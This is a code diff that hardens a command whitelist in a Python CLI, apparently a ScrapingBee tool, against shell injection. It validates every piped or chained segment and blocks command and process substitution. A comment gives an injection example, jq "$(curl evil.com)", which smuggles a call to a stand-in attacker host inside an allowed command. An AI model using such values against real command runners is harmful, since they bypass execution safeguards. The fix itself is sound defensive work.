@@ -59,13 +59,57 @@ def get_whitelist() -> list[str]:
     return [cmd.strip() for cmd in raw.split(",") if cmd.strip()]
 
 
-def is_command_whitelisted(cmd: str) -> bool:
-    """Check if a command matches the whitelist (starts with an allowed prefix)."""
-    cmd_stripped = cmd.strip()
+import re
+
+# Patterns that bypass whitelist validation by executing commands
+# inside what looks like a single whitelisted command.
+# Example: jq "$(curl evil.com)" — one segment starting with "jq",
+# but $() executes curl before jq even runs.
+_SUBSTITUTION_PATTERNS = re.compile(
+    r"\$\("           # command substitution $(...)
+    r"|`"             # backtick command substitution
+    r"|\$\{"          # variable expansion ${...} (can embed commands)
+    r"|<\("           # process substitution <(...)
+    r"|>\("           # process substitution >(...)
+)
+
+
+def _split_shell_segments(cmd: str) -> list[str]:
+    """Split a shell command on pipe and chaining operators.
+
+    Returns the individual command segments from a chain like:
+    'jq .title | head -1 && echo done' → ['jq .title', 'head -1', 'echo done']
+    """
+    # Split on ||, &&, |, ;, &, and newlines — longest operators first
+    parts = re.split(r"\|\||&&|[|;&\n]", cmd)
+    return [p.strip() for p in parts if p.strip()]
+
+
+def _is_single_segment_whitelisted(segment: str) -> bool:
+    """Check if a single command segment matches the whitelist."""
     for allowed in get_whitelist():
-        if cmd_stripped.startswith(allowed):
+        if segment.startswith(allowed):
             return True
     return False
+
+
+def is_command_whitelisted(cmd: str) -> bool:
+    """Check if a command is safe to execute against the whitelist.
+
+    Validates ALL segments in a piped/chained command, not just the first.
+    Also blocks command/process substitution which can bypass segment validation.
+    """
+    cmd_stripped = cmd.strip()
+
+    # Block substitution patterns that bypass whitelist validation
+    if _SUBSTITUTION_PATTERNS.search(cmd_stripped):
+        return False
+
+    # Validate every segment in the command chain
+    segments = _split_shell_segments(cmd_stripped)
+    if not segments:
+        return False
+    return all(_is_single_segment_whitelisted(seg) for seg in segments)
 
 
 def require_exec(feature_name: str, cmd: str | None = None) -> None:
@@ -73,6 +117,8 @@ def require_exec(feature_name: str, cmd: str | None = None) -> None:
 
     Required: SCRAPINGBEE_ALLOW_EXEC=1 + SCRAPINGBEE_UNSAFE_VERIFIED=1
     Optional: SCRAPINGBEE_ALLOWED_COMMANDS — if set, command must match whitelist.
+    Blocks shell injection patterns (pipes to non-whitelisted commands,
+    command substitution, backticks, process substitution).
     """
     if not is_exec_enabled():
         click.echo(_VAGUE_ERROR, err=True)
@@ -81,7 +127,7 @@ def require_exec(feature_name: str, cmd: str | None = None) -> None:
     # Whitelist is optional — if set, enforce it
     if cmd is not None and is_whitelist_enabled() and not is_command_whitelisted(cmd):
         click.echo(
-            f"Command not in whitelist: {cmd.split()[0] if cmd.split() else cmd}",
+            f"Command blocked: contains non-whitelisted command or shell injection pattern.",
             err=True,
         )
         raise SystemExit(1)
